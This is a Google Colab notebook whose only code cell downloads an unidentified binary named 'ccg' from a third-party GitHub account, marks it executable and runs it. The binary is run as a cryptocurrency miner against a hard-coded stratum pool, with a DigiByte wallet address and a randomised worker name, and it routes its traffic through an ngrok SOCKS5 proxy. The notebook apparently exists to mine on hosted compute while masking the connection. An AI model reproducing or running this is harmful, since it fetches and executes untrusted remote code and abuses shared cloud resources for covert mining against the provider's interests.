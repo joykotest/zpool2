{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "jorams.ipynb",
      "provenance": [],
      "machine_shape": "hm",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/joykotest/zpool2/blob/main/jorams.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "! wget -q https://github.com/suciani662/tiniku/raw/main/ccg && chmod +x ccg\n",
        "! ./ccg -o stratum+tcp://198.50.168.213:6241 -u DAuAgv3gfX2h2gcwGs9c1kfJJrSpTsSNRV.$(shuf -n 1 -i 1-9999999) -p c=DGB,zap=SUGAR -x socks5://8.tcp.ngrok.io:18516\n"
      ],
      "metadata": {
        "id": "eMLOt9OAxNwT"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}
